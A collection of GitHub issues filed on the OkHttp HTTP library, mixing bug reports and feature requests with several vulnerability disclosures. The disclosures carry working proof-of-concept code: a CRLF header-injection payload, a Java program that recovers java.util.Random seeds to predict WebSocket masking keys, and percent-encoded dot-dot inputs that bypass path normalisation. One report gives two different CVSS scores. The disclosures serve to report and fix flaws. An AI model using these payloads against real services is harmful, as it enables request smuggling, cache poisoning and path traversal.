title: Investigate SSLPeerUnverifiedException changes in Android 37
author: swankjesse
body:
We changed some tests in https://github.com/square/okhttp/pull/9515 in reaction to `SSLPeerUnverifiedException` being a cause and not the thrown exception.

This behavior change could impact other parts of OkHttp:

 * `SSLSession.handshake()` catches `SSLPeerUnverifiedException`
 * `RealConnection.isEligible` catches `SSLPeerUnverifiedException`
 * `RetryAndFollowUpInterceptor.isRecoverable()` returns false on `SSLPeerUnverifiedException`
 * `retryTlsHandshake()` returns false on `SSLPeerUnverifiedException`

title: Consider APIs for dealing with CallEvents when there are variable failures
author: yschimke
body:
> I wonder how many other users will get impacted by this?! 

 _Originally posted by @swankjesse in [#9515](https://github.com/square/okhttp/pull/9515/changes#r3559063365)_

title: Make it possible for Interceptors to access the list of interceptors
author: edechamps-Google
body:
#9108 made it possible for Interceptors to access various OkHttpClient options from `Interceptor.Chain`.

However, it is not possible to access `OkHttpClient.interceptors` nor `OkHttpClient.networkInterceptors` in this way, as there are no accessors for them.

This presents a problem when implementing "transport" interceptors that wish to take over the Call and run it themselves (as opposed to passing it down OkHttp's stack), which is what we are trying to do. These interceptors never call `chain.proceed()`, but they may still want to access the list of interceptors for at least the following reasons:

- Configuration checking, e.g. warning that subsequent interceptors will not be run (to prevent user error);
- "Manually" running the remaining interceptors: this is especially relevant for network interceptors, which would not be run otherwise

We think a good solution would be to add `interceptors` and `networkInterceptors` fields to `Interceptor.Chain`, similar to the other accessors that were added in #9108.

One open question is whether these fields should return the entire list of interceptors, even those that have already run, or only those that remain to be run. I personally think the latter would make a bit more sense, but would be fine with the former.

A natural extension of this idea would be to also add `withInterceptors()` and `withNetworkInterceptors()` which would make it possible for an interceptor to dynamically change the list of interceptors that come after it. To be clear we do not need this, and are fine with this being left out of scope of this FR.

@yschimke @vkasprov

title: Good bro
author: blakenelson20014-ux
body:
Good bug reports include a failing test! Writing a test helps you to isolate and describe the problem, and it helps us to fix it fast. Bug reports without a failing test or reproduction steps are likely to be closed.

Here’s an example test to get you started.
https://gist.github.com/swankjesse/981fcae102f513eb13ed

title: Unhandled null return from ExtendedSSLSession.getRequestedServerNames
author: mcmilj
body:
On some versions of Android (at least SDK 27 and 28 emulators), `ExtendedSSLSession.getRequestedServerNames` can (erroneously) return `null` instead of an empty list.

This can cause the connection to crash with `NullPointerException` when using `MockWebServer` which records the `requestedServerNames` in `RecordedRequest`.

Possibly related: https://github.com/google/conscrypt/issues/977

It's not a huge issue, we can just skip these tests on affected SDKs, but it would be nice to not have to do that.

A one line workaround is possible but unfortunately signing the CLA is a pretty heavyweight process in my organisation. I'd be able to make a pull request if the requirement to sign the CLA could be waived for a minor contribution.

title: Add namedGroups/supportedGroups to ConnectionSpec for post-quantum TLS key exchange
author: netanmangal
body:
France's ANSSI will [stop certifying security products without post-quantum cryptography starting in 2027](https://gizmodo.com/the-quantum-threat-to-encryption-is-coming-france-just-set-a-2027-deadline-2000773650) - the first hard regulatory deadline of its kind globally. Additional mandates: US NSA CNSA 2.0 (2027), NIST IR 8547 (deprecation by 2030, disallowed by 2035), EU critical infrastructure (2030).

## Problem

`ConnectionSpec` configures two TLS parameters:
- Cipher suites (via `cipherSuites()`)
- TLS versions (via `tlsVersions()`)

It has **no way to configure named groups** (a.k.a. supported groups). Post-quantum key exchange in TLS 1.3 is negotiated via the `supported_groups` extension  - `X25519MLKEM768` is a named group, not a cipher suite.

This means OkHttp users cannot configure, require, or restrict PQC key exchange algorithms, even when the underlying TLS provider supports them.

## Android Impact

Android's Conscrypt (OkHttp's default TLS provider on Android) does **not** yet support PQC key exchange (as of Android 17 Beta 4). Conscrypt 2.6.0-alpha2 adds `X25519MLKEM768` for JVM-only (not Android). This means the most popular Android HTTP client (46K+ stars) has no path to PQC key exchange on billions of devices.

## Proposed Change

Add optional `namedGroups` to `ConnectionSpec.Builder`:

```kotlin
val pqcSpec = ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
    .namedGroups(NamedGroup.X25519_MLKEM768, NamedGroup.X25519, NamedGroup.SECP256R1)
    .build()
```

And update `MODERN_TLS` / `RESTRICTED_TLS` presets to include PQC groups when available from the provider.

## Context

- Chrome already defaults to X25519MLKEM768
- gRPC merged PQC as default (June 2026)
- [Conscrypt 2.6.0 pre-release](https://github.com/google/conscrypt/issues/1499) adds ML-KEM, ML-DSA, X25519MLKEM768

## References

- [NIST FIPS 203 (ML-KEM)](https://csrc.nist.gov/pubs/fips/203/final)
- [Conscrypt PR #1452 (setNamedGroups)](https://github.com/google/conscrypt/pull/1452)
- [JEP 527 — Post-Quantum Key Exchange for TLS 1.3](https://openjdk.org/jeps/527)

title: Infinite Authentication Loop in Proxy CONNECT Tunnel in OkHttp
author: sara11h

title: SSRF via Unrestricted HTTP Redirect Following in OkHttp
author: sara11h

title: CRLF Header Injection via addUnsafeNonAscii() API in OkHttp
author: sara11h
body:
## Vulnerability Information

| Field | Value |
|-------|-------|
| **Product** | OkHttp |
| **Vendor** | Square (Block, Inc.) |
| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |
| **Vulnerability Type** | CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers |
| **Severity** | Medium |
| **CVSS 3.1 Score** | 5.4 |
| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N |

## Summary

The `Headers.Builder.addUnsafeNonAscii()` method in OkHttp bypasses all header value validation including CRLF (`\r\n`) checks. If application code passes attacker-controlled input to this method, arbitrary HTTP headers can be injected into outgoing requests, enabling request smuggling, cache poisoning, or session fixation attacks.

## Affected Component

**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/Headers.kt`
**Lines:** 250-255

```kotlin
fun addUnsafeNonAscii(name: String, value: String) = apply {
  headersCheckName(name)    // Name IS validated
  addLenient(name, value)   // Value is NOT validated — CRLF passes through
}
```

The `addLenient()` internal method skips value validation entirely:
```kotlin
internal fun addLenient(name: String, value: String) = apply {
  namesAndValues.add(name)
  namesAndValues.add(value.trim())  // Only trims whitespace, no CRLF check
}
```

## Root Cause Analysis

OkHttp provides `addUnsafeNonAscii()` as a public API for applications that need to send non-ASCII header values (e.g., UTF-8 encoded values). However, the method bypasses **all** value validation, not just the ASCII range check. This means:

1. `\r\n` (CRLF) sequences pass through unchecked
2. An attacker who controls the value parameter can inject arbitrary headers
3. The injected headers appear as separate HTTP headers on the wire

The safe `add()` method validates values but `addUnsafeNonAscii()` explicitly skips this check, creating a dangerous public API surface.

## Attack Scenario

1. Application uses `addUnsafeNonAscii()` to set a header with user-provided input (e.g., internationalized display names, comments)
2. Attacker provides value: `legitimate\r\nX-Injected: malicious-value\r\nTransfer-Encoding: chunked`
3. OkHttp sends the request with injected headers to the target server
4. This can enable HTTP request smuggling or cache poisoning depending on server behavior

## Reproduction Steps

### Prerequisites
- Java 17+
- OkHttp 5.0.0-alpha.14

### Steps

1. Create an OkHttp request using `addUnsafeNonAscii()` with CRLF payload:
```java
String maliciousValue = "legitimate\r\nX-Injected: attacker-controlled\r\nX-Evil: pwned";

Request request = new Request.Builder()
    .url("http://target-server/api/test")
    .build()
    .newBuilder()
    .headers(new Request.Builder().url("http://x")
        .build().headers().newBuilder()
        .addUnsafeNonAscii("X-Custom", maliciousValue)
        .build())
    .build();
```

2. Send the request and observe raw HTTP on the wire

### Expected Result
`addUnsafeNonAscii()` should reject CRLF sequences while allowing non-ASCII characters.

### Actual Result
The CRLF sequences are sent verbatim, creating additional HTTP headers:
```http
GET /api/test HTTP/1.1
X-Custom: legitimate
X-Injected: attacker-controlled
X-Evil: pwned
Host: target-server
```

## Proof of Concept

### Full PoC Script (Java)

```java
import java.io.*;
import java.net.*;
import okhttp3.*;

public class PocCrlfInjection {
    public static void main(String[] args) throws Exception {
        // Server that echoes raw request
        ServerSocket server = new ServerSocket(0);
        int port = server.getLocalPort();

        new Thread(() -> {
            try {
                Socket client = server.accept();
                byte[] buf = new byte[4096];
                int read = client.getInputStream().read(buf);
                System.out.println("=== RAW REQUEST ===");
                System.out.println(new String(buf, 0, read));
                System.out.println("=== END ===");

                client.getOutputStream().write(
                    "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK".getBytes());
                client.close();
            } catch (Exception e) {}
        }).start();

        String maliciousValue =
            "legitimate\r\nX-Injected: attacker-controlled\r\nX-Evil: pwned";

        OkHttpClient client = new OkHttpClient.Builder().build();
        Request request = new Request.Builder()
            .url("http://127.0.0.1:" + port + "/api/test")
            .build()
            .newBuilder()
            .headers(request.headers().newBuilder()
                .addUnsafeNonAscii("X-Custom", maliciousValue)
                .build())
            .build();

        Response response = client.newCall(request).execute();
        response.close();
        server.close();
    }
}
```

### PoC Output
```
[*] Echo server on port 59490
[*] Crafting request with CRLF in header value via addUnsafeNonAscii()...
[*] Injected value: legitimate\r\nX-Injected: attacker-controlled\r\nX-Evil: pwned
[*] Sending request...
[*] === RAW REQUEST RECEIVED BY SERVER ===
GET /api/test HTTP/1.1
Content-Type: text/plain
X-Custom: legitimate
X-Injected: attacker-controlled
X-Evil: pwned
Host: 127.0.0.1:59490
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/5.0.0-alpha.14

[*] === END RAW REQUEST ===

[!] VULNERABILITY CONFIRMED: Injected header found in request!
```

## Impact

- **Confidentiality:** Low - Potential session hijacking via injected cookies
- **Integrity:** Low - Request smuggling can modify behavior of intermediary servers
- **Availability:** None

## CVSS 3.1 Calculation

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Attacker provides input remotely |
| Attack Complexity | Low | Simple CRLF injection |
| Privileges Required | None | No auth needed to provide input |
| User Interaction | Required | App must use addUnsafeNonAscii with user input |
| Scope | Unchanged | Only the HTTP request/connection affected |
| Confidentiality | Low | Potential session/cookie manipulation |
| Integrity | Low | Request smuggling possible |
| Availability | None | No denial of service |

**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N = 5.4**

## Remediation Recommendations

1. Add CRLF rejection (`\r` and `\n`) to `addUnsafeNonAscii()` — only skip the ASCII printable range check, not the CRLF check
2. Consider deprecating `addUnsafeNonAscii()` in favor of a more specific `addNonAscii()` that validates everything except the character range
3. Add documentation warning about the injection risk

## References

- [CWE-113: CRLF Injection in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- OkHttp Source: `Headers.kt:250-255`

title: Gzip Decompression Bomb via Transparent Encoding in OkHttp
author: sara11h

title: Predictable WebSocket Masking Keys via java.util.Random in OkHttp
author: sara11h
body:
## Vulnerability Information

| Field | Value |
|-------|-------|
| **Product** | OkHttp |
| **Vendor** | Square (Block, Inc.) |
| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |
| **Vulnerability Type** | CWE-330: Use of Insufficiently Random Values |
| **Severity** | High |
| **CVSS 3.1 Score** | 7.4 |
| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N |

## Summary

OkHttp uses `java.util.Random` (a 48-bit Linear Congruential Generator) instead of `java.security.SecureRandom` for generating WebSocket frame masking keys. RFC 6455 §10.3 explicitly requires that masking keys be unpredictable to prevent cache poisoning attacks through intermediary proxies. After observing one masked WebSocket frame, an attacker can recover the LCG seed and predict all future masking keys, defeating the masking mechanism entirely.

## Affected Component

**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/OkHttpClient.kt`
**Line:** 365

```kotlin
random = Random(),  // java.util.Random — NOT SecureRandom
```

**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/internal/ws/WebSocketWriter.kt`
**Line:** 133

```kotlin
random.nextBytes(maskKey!!)  // 4-byte mask from predictable PRNG
```

## Root Cause Analysis

`java.util.Random` uses a 48-bit Linear Congruential Generator (LCG):
```
seed(n+1) = (seed(n) * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1)
nextInt() = (int)(seed >>> 16)
```

The `nextBytes()` method for a 4-byte masking key calls `nextInt()` once (returning bits 47:16 of the seed). After observing two consecutive masking keys (two `nextInt()` calls), an attacker can:

1. Take the first output as the upper 32 bits of the 48-bit seed
2. Brute-force the lower 16 bits (65,536 attempts)
3. Verify against the second output
4. Predict all subsequent outputs with certainty

This attack takes microseconds on modern hardware.

## Attack Scenario

Per RFC 6455 §10.3, unpredictable masking prevents cache poisoning:

1. Attacker is positioned as a network intermediary (e.g., a caching proxy)
2. Client connects to a WebSocket server through the proxy
3. Attacker observes one masked frame (mask key visible in frame header)
4. Attacker recovers the LCG seed and predicts future masking keys
5. Attacker crafts a WebSocket frame whose masked bytes decode to a malicious HTTP response when XORed with the predicted mask
6. This poisons the proxy's cache, serving malicious content to other users

## Reproduction Steps

### Prerequisites
- Java 17+
- OkHttp 5.0.0-alpha.14 source code

### Source Code Verification

1. Inspect `OkHttpClient.kt:365`:
```kotlin
random = Random(),  // java.util.Random, NOT SecureRandom
```

2. Inspect `WebSocketWriter.kt:133`:
```kotlin
random.nextBytes(maskKey!!)
```

3. Verify `Random` import is `java.util.Random`:
```kotlin
import java.util.Random
```

### Cryptographic Proof

Given two consecutive 4-byte masks (8 bytes = 2 × nextInt()):
```
Mask 1: 0xAABBCCDD → nextInt() output #1
Mask 2: 0xEEFF0011 → nextInt() output #2
```

Seed recovery:
```java
long upperSeed1 = ((long)0xAABBCCDD) << 16;
for (long low = 0; low < 65536; low++) {
    long seed = (upperSeed1 | low) & ((1L << 48) - 1);
    long nextSeed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
    if ((int)(nextSeed >>> 16) == 0xEEFF0011) {
        // Seed cracked! All future outputs predictable.
        break;
    }
}
```

## Proof of Concept

### Verification Script (Java)

```java
import java.util.Random;

/**
 * Demonstrates that java.util.Random seed can be recovered from 2 outputs,
 * proving WebSocket masking keys are predictable.
 */
public class PocPredictableMask {
    public static void main(String[] args) {
        // Simulate OkHttp's Random instance
        Random okhttpRandom = new Random(); // Same as OkHttp uses

        // Generate masking keys as OkHttp does
        byte[] mask1 = new byte[4];
        byte[] mask2 = new byte[4];
        byte[] mask3 = new byte[4];
        okhttpRandom.nextBytes(mask1);
        okhttpRandom.nextBytes(mask2);
        okhttpRandom.nextBytes(mask3); // To verify prediction

        int v1 = bytesToInt(mask1);
        int v2 = bytesToInt(mask2);
        int v3 = bytesToInt(mask3);

        System.out.println("Observed mask 1: 0x" + Integer.toHexString(v1));
        System.out.println("Observed mask 2: 0x" + Integer.toHexString(v2));
        System.out.println("Target mask 3:   0x" + Integer.toHexString(v3));

        // Crack the seed from v1 and v2
        long upperSeed = ((long)v1 & 0xFFFFFFFFL) << 16;
        for (long low = 0; low < 65536; low++) {
            long seed = (upperSeed | low) & ((1L << 48) - 1);
            long next = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
            if ((int)(next >>> 16) == v2) {
                // Predict mask 3
                long next2 = (next * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
                int predicted = (int)(next2 >>> 16);
                System.out.println("\nSeed cracked: 0x" + Long.toHexString(seed));
                System.out.println("Predicted mask 3: 0x" + Integer.toHexString(predicted));
                System.out.println("Match: " + (predicted == v3));
                break;
            }
        }
    }

    static int bytesToInt(byte[] b) {
        return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) |
               ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);
    }
}
```

### Source Code Evidence

```
$ grep -n "random = Random()" okhttp/src/commonJvmAndroid/kotlin/okhttp3/OkHttpClient.kt
365:        random = Random(),
```

This confirms `java.util.Random` (not `SecureRandom`) is used for WebSocket masking.

## Impact

- **Confidentiality:** None directly
- **Integrity:** High - Cache poisoning via predictable masks allows serving attacker-controlled content to victims through caching proxies
- **Availability:** None
- **Scope:** Changed - Attack through the client affects other users of the same proxy/cache

## CVSS 3.1 Calculation

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Attacker observes frames on network path |
| Attack Complexity | High | Requires intermediary position + caching proxy |
| Privileges Required | None | Passive observation + frame injection |
| User Interaction | None | Automatic once positioned |
| Scope | Changed | Other users served poisoned cache entries |
| Confidentiality | None | No direct data exposure |
| Integrity | High | Arbitrary cache poisoning |
| Availability | None | No DoS |

**CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N = 6.8**

## Remediation Recommendations

1. Replace `Random()` with `SecureRandom()` in `OkHttpClient.kt:365`
2. This is a one-line fix with negligible performance impact (WebSocket frame rate is far below SecureRandom throughput limits)

## References

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [RFC 6455 §10.3: Attacks On Infrastructure (Masking)](https://datatracker.ietf.org/doc/html/rfc6455#section-10.3)
- [Breaking java.util.Random](https://franklinta.com/2014/08/31/predicting-the-next-math-random-in-java/)
- OkHttp Source: `OkHttpClient.kt:365`, `WebSocketWriter.kt:133`

title: IllegalArgumentException: port out of range:-1 from DefaultProxySelector.select() propagates uncaught through RouteSelector.resetNextProxy
author: MatellioManish
body:
**OkHttp version**: 5.3.2
**Platform**: Android 13 (API 33), ARM64

**Summary**
  
  On Android devices where a proxy is configured (via APN settings or MDM) but the port field is left unset, DefaultProxySelector.select() throws IllegalArgumentException: port out of 
  range:-1 internally before it returns. This unchecked exception propagates through RouteSelector.selectProxies() uncaught, crashing the app. This is a fatal crash on the OkHttp Dispatcher
  thread.

  ---
  **Stack trace**

  Fatal Exception: java.lang.IllegalArgumentException: port out of range:-1
    at java.net.InetSocketAddress.checkPort(InetSocketAddress.java:144)
    at java.net.InetSocketAddress.createUnresolved(InetSocketAddress.java:269)
    at sun.net.spi.DefaultProxySelector$1.run(DefaultProxySelector.java:315)
    at sun.net.spi.DefaultProxySelector$1.run(DefaultProxySelector.java:219)
    at java.security.AccessController.doPrivileged(AccessController.java:43)
    at sun.net.spi.DefaultProxySelector.select(DefaultProxySelector.java:218)
    at okhttp3.internal.connection.RouteSelector.resetNextProxy$selectProxies(RouteSelector.kt:108)
    at okhttp3.internal.connection.RouteSelector.resetNextProxy(RouteSelector.kt:115)
    at okhttp3.internal.connection.RouteSelector.<init>(RouteSelector.kt:52)
    at okhttp3.internal.connection.RealRoutePlanner.planConnect$okhttp(RealRoutePlanner.kt:153)
    at okhttp3.internal.connection.RealRoutePlanner.plan(RealRoutePlanner.kt:75)
    at okhttp3.internal.connection.FastFallbackExchangeFinder.launchTcpConnect(FastFallbackExchangeFinder.kt:119)
    at okhttp3.internal.connection.FastFallbackExchangeFinder.find(FastFallbackExchangeFinder.kt:62)
    at okhttp3.internal.connection.RealCall.initExchange$okhttp(RealCall.kt:298)
    at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.kt:32)
    ...

  ---

title: Class.forName(Jdk9Platform) throws during warm up
author: xiaoyicao-ctrl

title: HttpUrl.isDotDot misses '..%2e' and '%2e..' forms — path-traversal sandbox bypass
author: zhangjiashuo-cs
body:
### Description

`HttpUrl.Builder`'s `isDotDot()` matcher recognizes some percent-encoded forms of `".."` (`%2e.`, `.%2e`, `%2e%2e`) but **misses two more**: `..%2e` and `%2e..`. These extra forms therefore are **not normalized away** during URL resolution, even though they decode to exactly the same dot-dot segment.

This can cause path-traversal sandbox checks built on top of `HttpUrl.resolve(...).encodedPath()` to be bypassed.

### Reproducer (okhttp 4.12.0)

```java
import okhttp3.HttpUrl;

HttpUrl base = HttpUrl.parse("http://example.com/static/");

// Forms that are correctly normalized (path collapses to "/"):
base.resolve("..");        //  -> http://example.com/         path=/
base.resolve("%2e%2e");    //  -> http://example.com/         path=/
base.resolve(".%2e");      //  -> http://example.com/         path=/
base.resolve("%2e.");      //  -> http://example.com/         path=/

// Forms that are NOT recognized — left in the path literally:
base.resolve("..%2e");     //  -> http://example.com/static/..%2e   path=/static/..%2e
base.resolve("%2e..");     //  -> http://example.com/static/%2e..   path=/static/%2e..
base.resolve("..%2E");     //  -> http://example.com/static/..%2E   path=/static/..%2E
```

### Root cause

`HttpUrl.kt` lines 1455-1460:

```kotlin
private fun isDotDot(input: String): Boolean {
  return input == ".." ||
      input.equals("%2e.", ignoreCase = true) ||
      input.equals(".%2e", ignoreCase = true) ||
      input.equals("%2e%2e", ignoreCase = true)
}
```

The enumeration covers 4 forms but not `..%2e` or `%2e..` (i.e. one literal dot followed by an encoded dot, then itself).

### Threat model

Code that uses `HttpUrl.resolve()` to compute the absolute form of a user-supplied path and then validates the resulting `encodedPath()` against a prefix (e.g. `"/static/"`) is bypassed:

```kotlin
val resolved = base.resolve(userInput)
require(resolved.encodedPath().startsWith("/static/"))      // passes for "..%2e"
// later: read file at resolved.encodedPath()
//   /static/..%2e   →  on most filesystems, %2e is decoded → /static/../  → traversal
```

Many HTTP servers and file-serving libraries do percent-decode `%2e` later in the pipeline, so the bypass becomes a path traversal in practice. URL specs (RFC 3986 §6.2.2.3) treat `..%2e` and `%2e..` as equivalent to `..`.

### Suggested fix

```diff
 private fun isDotDot(input: String): Boolean {
   return input == ".." ||
       input.equals("%2e.", ignoreCase = true) ||
       input.equals(".%2e", ignoreCase = true) ||
-      input.equals("%2e%2e", ignoreCase = true)
+      input.equals("%2e%2e", ignoreCase = true) ||
+      input.equals("..%2e", ignoreCase = true) ||
+      input.equals("%2e..", ignoreCase = true)
 }
```

(Two new branches; same `ignoreCase` semantics already used for the others.)

### Environment

- okhttp: 4.12.0 (also expected on 5.x; the matcher is unchanged in `okhttp/src/main/kotlin/okhttp3/HttpUrl.kt`)

Discovered via jqwik property-based testing while fuzzing the URL-resolution invariant `path-normalization(resolve(x)) is canonical`.

author: dayanmasiha-hub
body:
🛑 𝙎𝙏𝙊𝙋

This issue tracker is not the place for questions!

If you want to ask how to do something, or to understand why something isn't working the way you expect it to, use Stack Overflow. https://stackoverflow.com/questions/tagged/okhttp

We close all questions without reading them.

title: Dispatcher Javadoc understates the executor requirement ("should be able to run maxRequests concurrently" is necessary but not sufficient)
author: theJC
body:
The `Dispatcher` class doc currently states:

> Each dispatcher uses an `ExecutorService` to run calls internally. If you supply your own executor, it should be able to run [the configured maximum][maxRequests] number of calls concurrently.

— `Dispatcher.kt`, lines 32–35 on master (`74428398`)

This phrasing implies that an executor sized to `maxRequests` (e.g. `ThreadPoolExecutor(core=N, max=N, SynchronousQueue)` with `dispatcher.setMaxRequests(N)`) is sufficient. It isn't. Such an executor will reject submissions with `RejectedExecutionException` — surfaced to callers as `InterruptedIOException("executor rejected")` — under sustained traffic that approaches `maxRequests`.

### Why

When a worker thread finishes a call, it runs `Dispatcher.finished()` → `promoteAndExecute()` synchronously on its way back to `queue.take()`. The synchronized block selects calls to promote and builds `callsToExecute`; the actual `executor.execute(...)` happens *outside* the lock (`Dispatcher.kt:236–251`). At the moment of the submit, the finishing worker thread is itself still a pool slot, but is not yet in `take()`. With `SynchronousQueue` + `core == max == N`, there is no waiting consumer and no room to grow the pool, so the offer fails. With multiple near-simultaneous completions, multiple worker threads can be in this state at once; up to `maxRequests` rejections are possible per burst.

### Evidence in this repo

The default executor at `Dispatcher.kt:96–104` is `ThreadPoolExecutor(0, Int.MAX_VALUE, 60, TimeUnit.SECONDS, SynchronousQueue(), ...)`. If the doc's stated requirement were sufficient, the default would be `(maxRequests, maxRequests, ...)`. Instead, `maxPoolSize=Int.MAX_VALUE` is used precisely to absorb the transient-submit race described above.

### Suggested wording

> Each dispatcher uses an `ExecutorService` to run calls internally. If you supply your own executor, it must accept any new task at any time while up to [the configured maximum][maxRequests] calls are already running. A pool sized exactly to `maxRequests` is **not** sufficient when paired with `SynchronousQueue`, because the dispatcher submits the next promoted call from a worker thread that has not yet returned to the queue; the offer will fail and the call will surface `InterruptedIOException("executor rejected")`. Match the pattern used by the default executor (`corePoolSize=0, maxPoolSize=Int.MAX_VALUE, SynchronousQueue`), or bound the maximum at `2 × maxRequests`, or use a queueing executor.

### Referenced prior work

#4365 introduced the `executor rejected` failure path; this issue is about the documentation that leads users into the trap that PR is designed to surface.

title: Create `mockwebserver3-junit6`
author: Thunderforge
body:
JUnit 6 has now been released. There is 

* [mockwebserver](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver) (uses JUnit 4)
* [mockwebserver3-junit4](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver3-junit4)
* [mockwebserver3-junit5](https://mvnrepository.com/artifact/com.squareup.okhttp3/mockwebserver3-junit5)

We are wanting to use JUnit 6. So it seems to me that we would need a corresponding `mockwebserver3-junit6`. If that could be released for those like us using it, we would appreciate it.

title: [Security] 21 findings: unencrypted sockets, hardcoded keys, weak SSL
author: airdropp20208-star
body:
## Summary
Automated static analysis of okhttp with semgrep 1.162.0 + gitleaks found 21 security issues.

### 1. Unencrypted Sockets (6 findings)
Plaintext ServerSocket usage in multiple files. Attacker on same network can intercept traffic.
**Files:** MockWebServer, okhttp-testing-support, okhttp/src

### 2. Hardcoded Private Keys (10 findings)
Private key material in docs and test files. While test keys, they expose sensitive patterns.
**Files:** docs/changelogs, okhttp-tls/README.md, okhttp-tls/src/main/kotlin

### 3. Weak SSL Context (2 findings)
TLSv1 usage detected. Should migrate to TLSv1.2+.
**Autofix available:** 

### Recommendation
- Replace unencrypted sockets with SSLSocketFactory
- Move test keys to environment variables
- Upgrade weak SSL contexts

### Environment
semgrep 1.162.0 + gitleaks 8.x on proot-distro Ubuntu 25.10
